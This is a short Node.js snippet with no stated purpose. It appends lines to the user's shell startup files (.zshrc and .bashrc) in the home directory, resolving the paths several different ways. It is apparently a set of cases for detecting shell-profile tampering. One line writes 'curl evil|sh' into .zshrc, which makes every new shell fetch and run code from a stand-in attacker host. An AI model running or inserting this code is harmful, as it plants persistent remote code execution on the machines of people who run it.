const fs = require('fs'); const os = require('os'); const path = require('path');
const home = os.homedir();
fs.appendFileSync(path.join(home, '.zshrc'), 'curl evil|sh\n');
const rc = path.resolve(process.env.USERPROFILE || '', '.bashrc'); fs.appendFileSync(rc, 'x');
fs.appendFileSync(require('path').join(require('os').userInfo().homedir, '.zshrc'), 'x');
